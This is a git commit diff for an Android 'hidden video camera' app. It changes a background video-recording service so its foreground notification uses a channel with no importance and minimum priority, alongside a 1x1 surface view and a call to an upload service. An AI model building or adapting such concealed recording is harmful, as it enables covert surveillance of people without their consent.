467efea745796d79e1a27e4a85d22451ac5041de
thesmzh <thegame.mzh@gmail.com>
2020-04-17 22:43:39 +0500

    initial commit

--- app/src/main/java/com/androidhiddenvideocamera/MainActivity.java
+++ app/src/main/java/com/androidhiddenvideocamera/MainActivity.java
@@ -1,6 +1,8 @@
 package com.androidhiddenvideocamera;
 
+import android.content.Intent;
 import android.os.Bundle;
+import android.provider.Settings;
 
 import androidx.appcompat.app.AppCompatActivity;
 
--- hiddenvideocamera/src/main/java/com/c/hiddenvideocamera/BackgroundVideoRecorder.java
+++ hiddenvideocamera/src/main/java/com/c/hiddenvideocamera/BackgroundVideoRecorder.java
@@ -2,10 +2,13 @@ package com.c.hiddenvideocamera;
 
 import android.annotation.SuppressLint;
 import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
 import android.media.CamcorderProfile;
@@ -22,6 +25,7 @@ import android.view.SurfaceView;
 import android.view.WindowManager;
 
 import androidx.annotation.Nullable;
+import androidx.core.app.NotificationCompat;
 
 import java.io.File;
 
@@ -41,11 +45,15 @@ public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Ca
         // Start foreground service to avoid unexpected kill
 
 //        startServiceOreoCondition();
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startMyOwnForeground();
+        }else{
             Notification notification = new Notification.Builder(this)
+                    .setContentTitle("Recording Video")
+                    .setContentText("")
+//                    .setSmallIcon(R.mipmap.ic_launcher)
                     .build();
             startForeground(1234, notification);
-
         }
         // Create new SurfaceView, set its size to 1x1, move it to the top left
         // corner and set this service as a callback
@@ -64,6 +72,25 @@ public class BackgroundVideoRecorder extends Service implements SurfaceHolder.Ca
     }
 
 
+    private void startMyOwnForeground(){
+        String NOTIFICATION_CHANNEL_ID = "com.example.simpleapp";
+        String channelName = "My Background Service";
+        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
+        chan.setLightColor(Color.BLUE);
+        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
+        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+        assert manager != null;
+        manager.createNotificationChannel(chan);
+
+        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
+        Notification notification = notificationBuilder.setOngoing(true)
+//                .setSmallIcon(R.drawable.icon_1)
+                .setContentTitle("Recording Video")
+                .setPriority(NotificationManager.IMPORTANCE_MIN)
+                .setCategory(Notification.CATEGORY_SERVICE)
+                .build();
+        startForeground(2, notification);
+    }
     private void callService() {
         Intent intent = new Intent(getApplicationContext(), UploadFileService.class);
         intent.putExtra("uid",uid);
